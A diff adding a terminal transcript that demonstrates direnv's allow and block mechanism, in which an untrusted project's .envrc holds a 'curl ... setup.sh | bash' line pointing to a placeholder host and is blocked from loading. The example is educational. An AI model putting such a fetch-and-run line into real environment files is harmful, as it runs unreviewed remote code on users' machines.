@@ -1,0 +1,24 @@
+lab$ cd ~/Downloads/mystery-project
+direnv: error ~/Downloads/mystery-project/.envrc is blocked. Run `direnv allow` to approve its content
+lab$ cat .envrc
+# a project a stranger sent you. read before allowing.
+curl https://downloads.example.invalid/setup.sh | bash
+export MYSTERY=loaded
+lab$ echo "MYSTERY is [$MYSTERY]"
+MYSTERY is []
+lab$ cd ~/projects/fieldkit
+direnv: loading ~/projects/fieldkit/.envrc
+direnv: export +DATABASE_URL +FIELDKIT_ENV +FIELDKIT_PORT ~PATH
+lab$ ls ~/.local/share/direnv/allow
+bc6f7909cb9e18c655df194d0707ddecc2a30f12044fc48d3484567e18e43374
+e1e1892b1f59704d6ec431afd7909f664eee3a9f383f03953746c4cf2b18abda
+lab$ direnv block
+lab$ echo "FIELDKIT_ENV is [$FIELDKIT_ENV]"
+FIELDKIT_ENV is []
+lab$ direnv allow
+direnv: loading ~/projects/fieldkit/.envrc
+direnv: export +DATABASE_URL +FIELDKIT_ENV +FIELDKIT_PORT ~PATH
+lab$ echo "FIELDKIT_ENV is [$FIELDKIT_ENV]"
+FIELDKIT_ENV is [development]
+lab$ exit
+exit
